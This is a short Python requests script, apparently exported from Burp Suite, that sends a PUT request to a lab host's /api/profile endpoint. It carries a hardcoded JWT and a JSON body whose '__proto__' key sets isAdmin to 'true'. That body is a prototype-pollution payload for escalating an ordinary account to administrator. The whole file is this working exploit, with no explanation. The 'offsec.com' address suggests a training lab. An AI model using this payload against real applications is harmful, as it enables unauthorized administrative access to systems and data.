import requests

burp0_url = "http://192.168.154.230:5000/api/profile"
burp0_headers = {"x-auth-token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7ImlkIjoxNSwiZW1haWwiOiIxMjNAMTIzLmNvbSIsImlzQWRtaW4iOiJmYWxzZSJ9LCJpYXQiOjE3NjEyMzUyMzksImV4cCI6MTg0NzYzNTIzOX0.07f0G37KMAdickF28bQf0CMxO1jIWOfzNDFU01La4Oo", "Content-Type": "application/json"}
burp0_json={"__proto__": {"isAdmin": "true"}, "email": "admin1@offsec.com", "username": "admin1"}
requests.put(burp0_url, headers=burp0_headers, json=burp0_json)